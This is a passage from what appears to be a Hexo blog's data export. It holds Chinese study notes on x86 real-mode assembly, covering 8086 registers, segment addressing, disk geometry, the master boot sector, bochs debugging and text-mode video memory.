\t008机器指令\n\n在进行复杂运算时,会产生多个中间结果无法直接参与运算,因此设置多个寄存器\n\n在可以选择的情况下,机器指令就诞生了\n\n发送不同的指令执行不同的操作\n\n### \t009内存\n\n#### 用地址(编号)区分内存\n\nn根地址总线\t\t可寻址范围0~2^n-1  \t\t共2^n个地址\n\n8 Bits=1Byte\n\n每个内存单元长度为1Byte\n\n进位2^10=1024\n\nB->KB->MB->GB->TB->PB...\n\n#### 数据总线传输数据\n\n#### 控制总线\n\n发送读、写操作\n\n### 010自动计算\n\n指令指针寄存器\n\n指令计数器\n\n操作码-操作数\n\n立即数->操作数包含在指令中\n\n停机指令\n\n## 011处理器的历史\n\n控制部分,\tIO部分,\t运算、存储部分\n\nn位的处理器有n位的寄存器和ALU\n\n#### 指令集ISA:\n\n1.算术、逻辑运算\n\n2.数据传送指令\n\n3.处理器状态指令\n\n## 012 汇编语言的诞生\n\n抽象化,更简单,容易书写\n\n需要将汇编语言翻译为机器指令\n\n### \t013认识8086\n\n​\tAX、BX、CX、DX、SI、DI、BP、SP\n\n​\t\tX(16)->H(8) L(8)\n\nAX由AH和AL组成\n\n最高位15 14 13...1 0最低位\n\n每一个16进制代表四个二进制\n\n1Word=2Bytes\n\n### \t014 8086的内存访问和字节序\n\n​\t高位在高地址,低位在低地址\t\t-> 低端字节序\n\n​\t16位寄存器占用两个内存单元\n\n​\t数据总线为16位,当传输8位时,高8位不用\n\n### \t015 程序的分段\n\n占据连续的区段,称为代码/数据段\n\n### \t016程序重定位\n\nIPR=当前指令地址+当前指令长度\n\n如果在编写程序时使用固定地址(绝对地址/物理地址),当程序加载地址不同时,取得的数据就不一样,无法重定位.\n\n所以使用相对定位的方式,相对于数据段的地址进行偏移\n\n### \t017 段地址&偏移地址\n\n每次加载程序时,程序会定位段地址,我们则使用相对的偏移地址,这样就不需要改动程序的地址了~\n\n程序开始时,将起始代码段地址传送到IPR\n\n将数据段地址传送到DSR\n\nDSR+偏移地址\t的内存\n\n### \t018 8086在访问内存的困境\n\n​\t有20根地址线(1M),但只有16位的寄存器\n\n​\tCS Code Segment,代码段寄存器\n\n​\tDS Data Segment,数据段寄存器\n\n### \t019 8086段地址选择策略\n\n​\t只有以0结尾的地址才能成为段地址,并且要向右移一位\n\n​\t‘30CE0’  -> DS  -> ’30CE‘\n\n​\t这样就保证了20位的访问范围\n\n### \t020 8086的内存访问过程\n\n​\t将CS、DS赋值为起始地址(16进制)右移一位(除以16)\n\n​\t在访问内存时将段地址向左移动一位(16进制),再加上段偏移地址得到实际的地址\n\n### \t021 逻辑地址和分段地址的灵活性\n\n​\t\t段地址:偏移地址 e.g 65C7:0003\t逻辑地址\n\n​\t\t22567\n\n​\t\t2256:0007\n\n​\t\t2255:0017\n\n​\t\t...\n\n​\t\t1257:FFF7\n\n​\t\t一个段的长度最大是2^16,64K\n\n### \t022 略\n\n### \t023 创建汇编语言源程序\n\n本人使用MacOs环境,\n\n使用nasm作为编译器\n\n使用Sublime Text作为编辑器,使用插件\n\n​\t插件:\n\n​\t\t\t\t[汇编高亮](https://blog.csdn.net/liuchuo/article/details/51987174)\n\n​\t\t\t\t16进制查看器[HexViewer](https://facelessuser.github.io/HexViewer/)\n\n1.编写代码2.编译.obj文件3.链接形成二进制文件4.执行\n\n;注释\n\n### \t024~029 环境配置,略\n\n### \t030 8086加电、复位状态\n\n![截屏2021-08-05 下午12.26.04](https://tva1.sinaimg.cn/large/008i3skNly1gt5ssfcs8aj319g0u0ade.jpg)\n\n### \t031 8086地址空间分配![截屏2021-08-05 下午12.36.34](https://tva1.sinaimg.cn/large/008i3skNly1gt5t3d1k23j319g0u0dis.jpg)\n\n由于复位后cs为FFFF,所以开机后首先执行的就是FFFF:0000,即BIOS所在内存处\n\n### \t032 跳转指令\n\n开机后读取的地址为FFFF0,离末端FFFFF只有16字节,所以这里存放的都是跳转指令\n\n除非发生跳转,处理器执行顺序都是由低地址向高地址执行\n\nJMP\t 0xF000:0xE05B\n\nJMP\t段地址:偏移地址\n\n### \t033 硬盘构造和原理\n\nRound Per Minute\n\n盘片两面都有磁头,从第一个盘片的上面为磁头0,下面为磁头1,第二个盘片上面为磁头2,下面为磁头3\n\n磁头绕一圈就是一个磁道\n\n每个盘片的同一磁道形成一个竖着的圆柱,称为柱面,从边缘向圆心从0变大\n\n为了加速,尽量不移动柱面,上一磁道写满向下一磁道写\n\n将磁道看成一个圆被切开,每一块就是一个扇区,为512Bytes,通常63个扇区,从1开始编号\n\n每个扇区间都有空隙\n\n### \t034 从主引导扇区开始\n\nROM BIOS最后会将硬盘中的主引导扇区读到07C00处,然后跳转到那里执行\n\n0盘面0磁道1扇区为主引导扇区\n\n接力执行\n\n### \t035~036 virtual Box安装.略\n\n### \t037 虚拟硬盘(VHD)\n\n### \t043 创建主引导扇区程序\n\n​\t主引导扇区为512Byte,最后两个字节必须是0x55,0xAA\n\n```assembly\n;...\ntimes 502 db 0;重复502次定义单个空字节\ndb 0x55\ndb 0xAA\n```\n\nLBA逻辑地址块\n\n![截屏2021-08-05 下午6.57.34](https://tva1.sinaimg.cn/large/008i3skNly1gt643qk4osj319g0u0gws.jpg)\n\n### 045调试观察\n\nRAX\n\n![截屏2021-08-05 下午7.30.51](https://tva1.sinaimg.cn/large/008i3skNly1gt652d1t0fj319g0u0wgu.jpg)\n\n```\nbochs调试\nb 0x7c00  在此处下端点\nc  执行到断点停止\ns\t 执行下一条指令\nxp /512xb 0x7c00 以十六进制的方式,以字节为单位显示512个单位个内存地址0x7c00的内容\n\n```\n\n`$`的意思是“这里的地址”。\n\n`$$`的意思是“当前部分的开头地址”。\n\n所以`$-$$`的意思是“当前大小的部分”。\t\n\n### 047 显卡&显存\n\n通过更改显存中的数据,控制单个像素\n\n显卡两种工作模式\n\n​\t\t文本模式,图像模式\n\n显存被映射到内存空间中B000~BFFF,(32K)\n\n一个文字需要两个字节,字符编码和显示属性\n\n字符编码使用ASCII编码\n\n显示属性如下![截屏2021-08-05 下午8.36.45](https://tva1.sinaimg.cn/large/008i3skNly1gt66ywvqblj319g0u0tbu.jpg)\n\n![截屏2021-08-05 下午8.41.31](https://tva1.sinaimg.cn/large/008i3skNly1gt673w3u0tj319g0u0tce.jpg)\n\n### \t051MOV指令的形式和机器码\n\nMOV 目的,源\n\n宽度必须相同\n\n两个操作数不能同时是地址\n\n段寄存器不能直接用立即数修改\n\n不能修改IP寄存器\n\n使用`nasm a.asm -l a.lst`生成列表文件,有**汇编地址**,汇编语句,机器码对应阅读\n\n### \t053 使用标号\n\nsign:\n\n`times 510-(current-start) db 0`\n\n### \t054 段间直接绝对跳转指令\n\n​\tjmp\t段地址:偏移地址\n\n​\t注意:此操作会修改段寄存器\n\n","source":"_posts/x86实模式&保护模式.md","raw":"---\ntitle: x86学习笔记\ndate: 2021-08-05 23:25:30\ntags: OS\n---\n# x86实模式&保护模式\n\n## 我的github项目~https://github.com/busizhiya/x86-Assembly-learning\n## 001 简述\n\n### 学习目的:\n\n1.了解解计算机的底层原理,如何与硬件沟通,不只是汇编原理\n\t\t2.学习计算机工作远离,8086实模式,保护模式、特权级、分页、多任务、任务切换\n\t\t3.打下好基础,提升对计算机系统、操作系统的认识\n\n## 002 计算机的概述\n\n### \t003加法器\n\n### \t004用电表示数\n\n​\t\t开关/电平高低\n\n### \t005寄存器/锁存器\n\n​\t\t锁存,保存数据:触发器\n\n### \t006带寄存器的加法机\n\n准备输入A,按下预置,将数字A存入寄存器\n\n准备输入B,点击相加,将寄存器中内容与B相加\n\n...\n\n无论何时,加法器的输出为寄存器\n\n### \t007四则运算电路\n\n预置,锁存\n\n加、减、乘、除\n\n将输入与寄存器中内容进行运算,存回寄存器\n\n将运算结果存回寄存器以达到连续运算的效果\n\n### \t008机器指令\n\n在进行复杂运算时,会产生多个中间结果无法直接参与运算,因此设置多个寄存器\n\n在可以选择的情况下,机器指令就诞生了\n\n发送不同的指令执行不同的操作\n\n### \t009内存\n\n#### 用地址(编号)区分内存\n\nn根地址总线\t\t可寻址范围0~2^n-1  \t\t共2^n个地址\n\n8 Bits=1Byte\n\n每个内存单元长度为1Byte\n\n进位2^10=1024\n\nB->KB->MB->GB->TB->PB...\n\n#### 数据总线传输数据\n\n#### 控制总线\n\n发送读、写操作\n\n### 010自动计算\n\n指令指针寄存器\n\n指令计数器\n\n操作码-操作数\n\n立即数->操作数包含在指令中\n\n停机指令\n\n## 011处理器的历史\n\n控制部分,\tIO部分,\t运算、存储部分\n\nn位的处理器有n位的寄存器和ALU\n\n#### 指令集ISA:\n\n1.算术、逻辑运算\n\n2.数据传送指令\n\n3.处理器状态指令\n\n## 012 汇编语言的诞生\n\n抽象化,更简单,容易书写\n\n需要将汇编语言翻译为机器指令\n\n### \t013认识8086\n\n​\tAX、BX、CX、DX、SI、DI、BP、SP\n\n​\t\tX(16)->H(8) L(8)\n\nAX由AH和AL组成\n\n最高位15 14 13...1 0最低位\n\n每一个16进制代表四个二进制\n\n1Word=2Bytes\n\n### \t014 8086的内存访问和字节序\n\n​\t高位在高地址,低位在低地址\t\t-> 低端字节序\n\n​\t16位寄存器占用两个内存单元\n\n​\t数据总线为16位,当传输8位时,高8位不用\n\n### \t015 程序的分段\n\n占据连续的区段,称为代码/数据段\n\n### \t016程序重定位\n\nIPR=当前指令地址+当前指令长度\n\n如果在编写程序时使用固定地址(绝对地址/物理地址),当程序加载地址不同时,取得的数据就不一样,无法重定位.\n\n所以使用相对定位的方式,相对于数据段的地址进行偏移\n\n### \t017 段地址&偏移地址\n\n每次加载程序时,程序会定位段地址,我们则使用相对的偏移地址,这样就不需要改动程序的地址了~\n\n程序开始时,将起始代码段地址传送到IPR\n\n将数据段地址传送到DSR\n\nDSR+偏移地址\t的内存\n\n### \t018 8086在访问内存的困境\n\n​\t有20根地址线(1M),但只有16位的寄存器\n\n​\tCS Code Segment,代码段寄存器\n\n​\tDS Data Segment,数据段寄存器\n\n### \t019 8086段地址选择策略\n\n​\t只有以0结尾的地址才能成为段地址,并且要向右移一位\n\n​\t‘30CE0’  -> DS  -> ’30CE‘\n\n​\t这样就保证了20位的访问范围\n\n### \t020 8086的内存访问过程\n\n​\t将CS、DS赋值为起始地址(16进制)右移一位(除以16)\n\n​\t在访问内存时将段地址向左移动一位(16进制),再加上段偏移地址得到实际的地址\n\n### \t021 逻辑地址和分段地址的灵活性\n\n​\t\t段地址:偏移地址 e.g 65C7:0003\t逻辑地址\n\n​\t\t22567\n\n​\t\t2256:0007\n\n​\t\t2255:0017\n\n​\t\t...\n\n​\t\t1257:FFF7\n\n​\t\t一个段的长度最大是2^16,64K\n\n### \t022 略\n\n### \t023 创建汇编语言源程序\n\n本人使用MacOs环境,\n\n使用nasm作为编译器\n\n使用Sublime Text作为编辑器,使用插件\n\n​\t插件:\n\n​\t\t\t\t[汇编高亮](https://blog.csdn.net/liuchuo/article/details/51987174)\n\n​\t\t\t\t16进制查看器[HexViewer](https://facelessuser.github.io/HexViewer/)\n\n1.编写代码2.编译.obj文件3.链接形成二进制文件4.执行\n\n;注释\n\n### \t024~029 环境配置,略\n\n### \t030 8086加电、复位状态\n\n![截屏2021-08-05 下午12.26.04](https://tva1.sinaimg.cn/large/008i3skNly1gt5ssfcs8aj319g0u0ade.jpg)\n\n### \t031 8086地址空间分配![截屏2021-08-05 下午12.36.34](https://tva1.sinaimg.cn/large/008i3skNly1gt5t3d1k23j319g0u0dis.jpg)\n\n由于复位后cs为FFFF,所以开机后首先执行的就是FFFF:0000,即BIOS所在内存处\n\n### \t032 跳转指令\n\n开机后读取的地址为FFFF0,离末端FFFFF只有16字节,所以这里存放的都是跳转指令\n\n除非发生跳转,处理器执行顺序都是由低地址向高地址执行\n\nJMP\t 0xF000:0xE05B\n\nJMP\t段地址:偏移地址\n\n### \t033 硬盘构造和原理\n\nRound Per Minute\n\n盘片两面都有磁头,从第一个盘片的上面为磁头0,下面为磁头1,第二个盘片上面为磁头2,下面为磁头3\n\n磁头绕一圈就是一个磁道\n\n每个盘片的同一磁道形成一个竖着的圆柱,称为柱面,从边缘向圆心从0变大\n\n为了加速,尽量不移动柱面,上一磁道写满向下一磁道写\n\n将磁道看成一个圆被切开,每一块就是一个扇区,为512Bytes,通常63个扇区,从1开始编号\n\n每个扇区间都有空隙\n\n### \t034 从主引导扇区开始\n\nROM BIOS最后会将硬盘中的主引导扇区读到07C00处,然后跳转到那里执行\n\n0盘面0磁道1扇区为主引导扇区\n\n接力执行\n\n### \t035~036 virtual Box安装.略\n\n### \t037 虚拟硬盘(VHD)\n\n### \t043 创建主引导扇区程序\n\n​\t主引导扇区为512Byte,最后两个字节必须是0x55,0xAA\n\n```assembly\n;...\ntimes 502 db 0;重复502次定义单个空字节\ndb 0x55\ndb 0xAA\n```\n\nLBA逻辑地址块\n\n![截屏2021-08-05 下午6.57.34](https://tva1.sinaimg.cn/large/008i3skNly1gt643qk4osj319g0u0gws.jpg)\n\n### 045调试观察\n\nRAX\n\n![截屏2021-08-05 下午7.30.51](https://tva1.sinaimg.cn/large/008i3skNly1gt652d1t0fj319g0u0wgu.jpg)\n\n```\nbochs调试\nb 0x7c00  在此处下端点\nc  执行到断点停止\ns\t 执行下一条指令\nxp /512xb 0x7c00 以十六进制的方式,以字节为单位显示512个单位个内存地址0x7c00的内容\n\n```\n\n`$`的意思是“这里的地址”。\n\n`$$`的意思是“当前部分的开头地址”。\n\n所以`$-$$`的意思是“当前大小的部分”。\t\n\n### 047 显卡&显存\n\n通过更改显存中的数据,控制单个像素\n\n显卡两种工作模式\n\n​\t\t文本模式,图像模式\n\n显存被映射到内存空间中B000~BFFF,(32K)\n\n一个文字需要两个字节,字符编码和显示属性\n\n字符编码使用ASCII编码\n\n显示属性如下![截屏2021-08-05 下午8.36.45](https://tva1.sinaimg.cn/large/008i3skNly1gt66ywvqblj319g0u0tbu.jpg)\n\n![截屏2021-08-05 下午8.41.31](https://tva1.sinaimg.cn/large/008i3skNly1gt673w3u0tj319g0u0tce.jpg)\n\n### \t051MOV指令的形式和机器码\n\nMOV 目的,源\n\n宽度必须相同\n\n两个操作数不能同时是地址\n\n段寄存器不能直接用立即数修改\n\n不能修改IP寄存器\n\n使用`nasm a.asm -l a.lst`生成列表文件,有**汇编地址**,汇编语句,机器码对应阅读\n\n### \t053 使用标号\n\nsign:\n\n`times 510-(current-start) db 0`\n\n### \t054 段间直接绝对跳转指令\n\n​\tjmp\t段地址:偏移地址\n\n​\t注意:此操作会修改段寄存器\n\n","slug":"x86实模式&保护模式","published":1,"updated":"2021-08-06T13:12:16.018Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cks0fwiba00019t7f4opk0ew5","content":"<h1 id=\"x86实模式-amp-保护模式\"><a href=\"#x86实模式-amp-保护模式\" class=\"headerlink\" title=\"x86实模式&amp;保护模式\"></a>x86实模式&amp;保护模式</h1><h2 id=\"我的github项目-https-github-com-busizhiya-x86-Assembly-learning\"><a href=\"#我的github项目-https-github-com-busizhiya-x86-Assembly-learning\" class=\"headerlink\" title=\"我的github项目~https://github.com/busizhiya/x86-Assembly-learning\"></a>我的github项目~<a href=\"https://github.com/busizhiya/x86-Assembly-learning\">https://github.com/busizhiya/x86-Assembly-learning</a></h2><h2 id=\"001-简述\"><a href=\"#001-简述\" class=\"headerlink\" title=\"001 简述\"></a>001 简述</h2><h3 id=\"学习目的\"><a href=\"#学习目的\" class=\"headerlink\" title=\"学习目的:\"></a>学习目的:</h3><p>1.了解解计算机的底层原理,如何与硬件沟通,不只是汇编原理<br>        2.学习计算机工作远离,8086实模式,保护模式、特权级、分页、多任务、任务切换<br>        3.打下好基础,提升对计算机系统、操作系统的认识</p>\n<h2 id=\"002-计算机的概述\"><a href=\"#002-计算机的概述\" class=\"headerlink\" title=\"002 计算机的概述\"></a>002 计算机的概述</h2><h3 id=\"003加法器\"><a href=\"#003加法器\" class=\"headerlink\" title=\"003加法器\"></a>003加法器</h3><h3 id=\"004用电表示数\"><a href=\"#004用电表示数\" class=\"headerlink\" title=\"004用电表示数\"></a>004用电表示数</h3><p>​        开关/电平高低</p>\n<h3 id=\"005寄存器-锁存器\"><a href=\"#005寄存器-锁存器\" class=\"headerlink\" title=\"005寄存器/锁存器\"></a>005寄存器/锁存器</h3><p>​        锁存,保存数据:触发器</p>\n<h3 id=\"006带寄存器的加法机\"><a href=\"#006带寄存器的加法机\" class=\"headerlink\" title=\"006带寄存器的加法机\"></a>006带寄存器的加法机</h3><p>准备输入A,按下预置,将数字A存入寄存器</p>\n<p>准备输入B,点击相加,将寄存器中内容与B相加</p>\n<p>…</p>\n<p>无论何时,加法器的输出为寄存器</p>\n<h3 id=\"007四则运算电路\"><a href=\"#007四则运算电路\" class=\"headerlink\" title=\"007四则运算电路\"></a>007四则运算电路</h3><p>预置,锁存</p>\n<p>加、减、乘、除</p>\n<p>将输入与寄存器中内容进行运算,存回寄存器</p>\n<p>将运算结果存回寄存器以达到连续运算的效果</p>\n<h3 id=\"008机器指令\"><a href=\"#008机器指令\" class=\"headerlink\" title=\"008机器指令\"></a>008机器指令</h3><p>在进行复杂运算时,会产生多个中间结果无法直接参与运算,因此设置多个寄存器</p>\n<p>在可以选择的情况下,机器指令就诞生了</p>\n<p>发送不同的指令执行不同的操作</p>\n<h3 id=\"009内存\"><a href=\"#009内存\" class=\"headerlink\" title=\"009内存\"></a>009内存</h3><h4 id=\"用地址-编号-区分内存\"><a href=\"#用地址-编号-区分内存\" class=\"headerlink\" title=\"用地址(编号)区分内存\"></a>用地址(编号)区分内存</h4><p>n根地址总线        可寻址范围0~2^n-1          共2^n个地址</p>\n<p>8 Bits=1Byte</p>\n<p>每个内存单元长度为1Byte</p>\n<p>进位2^10=1024</p>\n<p>B-&gt;KB-&gt;MB-&gt;GB-&gt;TB-&gt;PB…</p>\n<h4 id=\"数据总线传输数据\"><a href=\"#数据总线传输数据\" class=\"headerlink\" title=\"数据总线传输数据\"></a>数据总线传输数据</h4><h4 id=\"控制总线\"><a href=\"#控制总线\" class=\"headerlink\" title=\"控制总线\"></a>控制总线</h4><p>发送读、写操作</p>\n<h3 id=\"010自动计算\"><a href=\"#010自动计算\" class=\"headerlink\" title=\"010自动计算\"></a>010自动计算</h3><p>指令指针寄存器</p>\n<p>指令计数器</p>\n<p>操作码-操作数</p>\n<p>立即数-&gt;操作数包含在指令中</p>\n<p>停机指令</p>\n<h2 id=\"011处理器的历史\"><a href=\"#011处理器的历史\" class=\"headerlink\" title=\"011处理器的历史\"></a>011处理器的历史</h2><p>控制部分,    IO部分,    运算、存储部分</p>\n<p>n位的处理器有n位的寄存器和ALU</p>\n<h4 id=\"指令集ISA\"><a href=\"#指令集ISA\" class=\"headerlink\" title=\"指令集ISA:\"></a>指令集ISA:</h4><p>1.算术、逻辑运算</p>\n<p>2.数据传送指令</p>\n<p>3.处理器状态指令</p>\n<h2 id=\"012-汇编语言的诞生\"><a href=\"#012-汇编语言的诞生\" class=\"headerlink\" title=\"012 汇编语言的诞生\"></a>012 汇编语言的诞生</h2><p>抽象化,更简单,容易书写</p>\n<p>需要将汇编语言翻译为机器指令</p>\n<h3 id=\"013认识8086\"><a href=\"#013认识8086\" class=\"headerlink\" title=\"013认识8086\"></a>013认识8086</h3><p>​    AX、BX、CX、DX、SI、DI、BP、SP</p>\n<p>​        X(16)-&gt;H(8) L(8)</p>\n<p>AX由AH和AL组成</p>\n<p>最高位15 14 13…1 0最低位</p>\n<p>每一个16进制代表四个二进制</p>\n<p>1Word=2Bytes</p>\n<h3 id=\"014-8086的内存访问和字节序\"><a href=\"#014-8086的内存访问和字节序\" class=\"headerlink\" title=\"014 8086的内存访问和字节序\"></a>014 8086的内存访问和字节序</h3><p>​    高位在高地址,低位在低地址        -&gt; 低端字节序</p>\n<p>​    16位寄存器占用两个内存单元</p>\n<p>​    数据总线为16位,当传输8位时,高8位不用</p>\n<h3 id=\"015-程序的分段\"><a href=\"#015-程序的分段\" class=\"headerlink\" title=\"015 程序的分段\"></a>015 程序的分段</h3><p>占据连续的区段,称为代码/数据段</p>\n<h3 id=\"016程序重定位\"><a href=\"#016程序重定位\" class=\"headerlink\" title=\"016程序重定位\"></a>016程序重定位</h3><p>IPR=当前指令地址+当前指令长度</p>\n<p>如果在编写程序时使用固定地址(绝对地址/物理地址),当程序加载地址不同时,取得的数据就不一样,无法重定位.</p>\n<p>所以使用相对定位的方式,相对于数据段的地址进行偏移</p>\n<h3 id=\"017-段地址-amp-偏移地址\"><a href=\"#017-段地址-amp-偏移地址\" class=\"headerlink\" title=\"017 段地址&amp;偏移地址\"></a>017 段地址&amp;偏移地址</h3><p>每次加载程序时,程序会定位段地址,我们则使用相对的偏移地址,这样就不需要改动程序的地址了~</p>\n<p>程序开始时,将起始代码段地址传送到IPR</p>\n<p>将数据段地址传送到DSR</p>\n<p>DSR+偏移地址    的内存</p>\n<h3 id=\"018-8086在访问内存的困境\"><a href=\"#018-8086在访问内存的困境\" class=\"headerlink\" title=\"018 8086在访问内存的困境\"></a>018 8086在访问内存的困境</h3><p>​    有20根地址线(1M),但只有16位的寄存器</p>\n<p>​    CS Code Segment,代码段寄存器</p>\n<p>​    DS Data Segment,数据段寄存器</p>\n<h3 id=\"019-8086段地址选择策略\"><a href=\"#019-8086段地址选择策略\" class=\"headerlink\" title=\"019 8086段地址选择策略\"></a>019 8086段地址选择策略</h3><p>​    只有以0结尾的地址才能成为段地址,并且要向右移一位</p>\n<p>​    ‘30CE0’  -&gt; DS  -&gt; ’30CE‘</p>\n<p>​    这样就保证了20位的访问范围</p>\n<h3 id=\"020-8086的内存访问过程\"><a href=\"#020-8086的内存访问过程\" class=\"headerlink\" title=\"020 8086的内存访问过程\"></a>020 8086的内存访问过程</h3><p>​    将CS、DS赋值为起始地址(16进制)右移一位(除以16)</p>\n<p>​    在访问内存时将段地址向左移动一位(16进制),再加上段偏移地址得到实际的地址</p>\n<h3 id=\"021-逻辑地址和分段地址的灵活性\"><a href=\"#021-逻辑地址和分段地址的灵活性\" class=\"headerlink\" title=\"021 逻辑地址和分段地址的灵活性\"></a>021 逻辑地址和分段地址的灵活性</h3><p>​        段地址:偏移地址 e.g 65C7:0003    逻辑地址</p>\n<p>​        22567</p>\n<p>​        2256:0007</p>\n<p>​        2255:0017</p>\n<p>​        …</p>\n<p>​        1257:FFF7</p>\n<p>​        一个段的长度最大是2^16,64K</p>\n<h3 id=\"022-略\"><a href=\"#022-略\" class=\"headerlink\" title=\"022 略\"></a>022 略</h3><h3 id=\"023-创建汇编语言源程序\"><a href=\"#023-创建汇编语言源程序\" class=\"headerlink\" title=\"023 创建汇编语言源程序\"></a>023 创建汇编语言源程序</h3><p>本人使用MacOs环境,</p>\n<p>使用nasm作为编译器</p>\n<p>使用Sublime Text作为编辑器,使用插件</p>\n<p>​    插件:</p>\n<p>​                <a href=\"https://blog.csdn.net/liuchuo/article/details/51987174\">汇编高亮</a></p>\n<p>​                16进制查看器<a href=\"https://facelessuser.github.io/HexViewer/\">HexViewer</a></p>\n<p>1.编写代码2.编译.obj文件3.链接形成二进制文件4.执行</p>\n<p>;注释</p>\n<h3 id=\"024-029-环境配置-略\"><a href=\"#024-029-环境配置-略\" class=\"headerlink\" title=\"024~029 环境配置,略\"></a>024~029 环境配置,略</h3><h3 id=\"030-8086加电、复位状态\"><a href=\"#030-8086加电、复位状态\" class=\"headerlink\" title=\"030 8086加电、复位状态\"></a>030 8086加电、复位状态</h3><p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt5ssfcs8aj319g0u0ade.jpg\" alt=\"截屏2021-08-05 下午12.26.04\"></p>\n<h3 id=\"031-8086地址空间分配\"><a href=\"#031-8086地址空间分配\" class=\"headerlink\" title=\"031 8086地址空间分配\"></a>031 8086地址空间分配<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt5t3d1k23j319g0u0dis.jpg\" alt=\"截屏2021-08-05 下午12.36.34\"></h3><p>由于复位后cs为FFFF,所以开机后首先执行的就是FFFF:0000,即BIOS所在内存处</p>\n<h3 id=\"032-跳转指令\"><a href=\"#032-跳转指令\" class=\"headerlink\" title=\"032 跳转指令\"></a>032 跳转指令</h3><p>开机后读取的地址为FFFF0,离末端FFFFF只有16字节,所以这里存放的都是跳转指令</p>\n<p>除非发生跳转,处理器执行顺序都是由低地址向高地址执行</p>\n<p>JMP     0xF000:0xE05B</p>\n<p>JMP    段地址:偏移地址</p>\n<h3 id=\"033-硬盘构造和原理\"><a href=\"#033-硬盘构造和原理\" class=\"headerlink\" title=\"033 硬盘构造和原理\"></a>033 硬盘构造和原理</h3><p>Round Per Minute</p>\n<p>盘片两面都有磁头,从第一个盘片的上面为磁头0,下面为磁头1,第二个盘片上面为磁头2,下面为磁头3</p>\n<p>磁头绕一圈就是一个磁道</p>\n<p>每个盘片的同一磁道形成一个竖着的圆柱,称为柱面,从边缘向圆心从0变大</p>\n<p>为了加速,尽量不移动柱面,上一磁道写满向下一磁道写</p>\n<p>将磁道看成一个圆被切开,每一块就是一个扇区,为512Bytes,通常63个扇区,从1开始编号</p>\n<p>每个扇区间都有空隙</p>\n<h3 id=\"034-从主引导扇区开始\"><a href=\"#034-从主引导扇区开始\" class=\"headerlink\" title=\"034 从主引导扇区开始\"></a>034 从主引导扇区开始</h3><p>ROM BIOS最后会将硬盘中的主引导扇区读到07C00处,然后跳转到那里执行</p>\n<p>0盘面0磁道1扇区为主引导扇区</p>\n<p>接力执行</p>\n<h3 id=\"035-036-virtual-Box安装-略\"><a href=\"#035-036-virtual-Box安装-略\" class=\"headerlink\" title=\"035~036 virtual Box安装.略\"></a>035~036 virtual Box安装.略</h3><h3 id=\"037-虚拟硬盘-VHD\"><a href=\"#037-虚拟硬盘-VHD\" class=\"headerlink\" title=\"037 虚拟硬盘(VHD)\"></a>037 虚拟硬盘(VHD)</h3><h3 id=\"043-创建主引导扇区程序\"><a href=\"#043-创建主引导扇区程序\" class=\"headerlink\" title=\"043 创建主引导扇区程序\"></a>043 创建主引导扇区程序</h3><p>​    主引导扇区为512Byte,最后两个字节必须是0x55,0xAA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;...</span><br><span class=\"line\">times 502 db 0;重复502次定义单个空字节</span><br><span class=\"line\">db 0x55</span><br><span class=\"line\">db 0xAA</span><br></pre></td></tr></table></figure>\n\n<p>LBA逻辑地址块</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt643qk4osj319g0u0gws.jpg\" alt=\"截屏2021-08-05 下午6.57.34\"></p>\n<h3 id=\"045调试观察\"><a href=\"#045调试观察\" class=\"headerlink\" title=\"045调试观察\"></a>045调试观察</h3><p>RAX</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt652d1t0fj319g0u0wgu.jpg\" alt=\"截屏2021-08-05 下午7.30.51\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bochs调试</span><br><span class=\"line\">b 0x7c00  在此处下端点</span><br><span class=\"line\">c  执行到断点停止</span><br><span class=\"line\">s\t 执行下一条指令</span><br><span class=\"line\">xp &#x2F;512xb 0x7c00 以十六进制的方式,以字节为单位显示512个单位个内存地址0x7c00的内容</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>$</code>的意思是“这里的地址”。</p>\n<p><code>$$</code>的意思是“当前部分的开头地址”。</p>\n<p>所以<code>$-$$</code>的意思是“当前大小的部分”。    </p>\n<h3 id=\"047-显卡-amp-显存\"><a href=\"#047-显卡-amp-显存\" class=\"headerlink\" title=\"047 显卡&amp;显存\"></a>047 显卡&amp;显存</h3><p>通过更改显存中的数据,控制单个像素</p>\n<p>显卡两种工作模式</p>\n<p>​        文本模式,图像模式</p>\n<p>显存被映射到内存空间中B000~BFFF,(32K)</p>\n<p>一个文字需要两个字节,字符编码和显示属性</p>\n<p>字符编码使用ASCII编码</p>\n<p>显示属性如下<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt66ywvqblj319g0u0tbu.jpg\" alt=\"截屏2021-08-05 下午8.36.45\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt673w3u0tj319g0u0tce.jpg\" alt=\"截屏2021-08-05 下午8.41.31\"></p>\n<h3 id=\"051MOV指令的形式和机器码\"><a href=\"#051MOV指令的形式和机器码\" class=\"headerlink\" title=\"051MOV指令的形式和机器码\"></a>051MOV指令的形式和机器码</h3><p>MOV 目的,源</p>\n<p>宽度必须相同</p>\n<p>两个操作数不能同时是地址</p>\n<p>段寄存器不能直接用立即数修改</p>\n<p>不能修改IP寄存器</p>\n<p>使用<code>nasm a.asm -l a.lst</code>生成列表文件,有<strong>汇编地址</strong>,汇编语句,机器码对应阅读</p>\n<h3 id=\"053-使用标号\"><a href=\"#053-使用标号\" class=\"headerlink\" title=\"053 使用标号\"></a>053 使用标号</h3><p>sign:</p>\n<p><code>times 510-(current-start) db 0</code></p>\n<h3 id=\"054-段间直接绝对跳转指令\"><a href=\"#054-段间直接绝对跳转指令\" class=\"headerlink\" title=\"054 段间直接绝对跳转指令\"></a>054 段间直接绝对跳转指令</h3><p>​    jmp    段地址:偏移地址</p>\n<p>​    注意:此操作会修改段寄存器</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"x86实模式-amp-保护模式\"><a href=\"#x86实模式-amp-保护模式\" class=\"headerlink\" 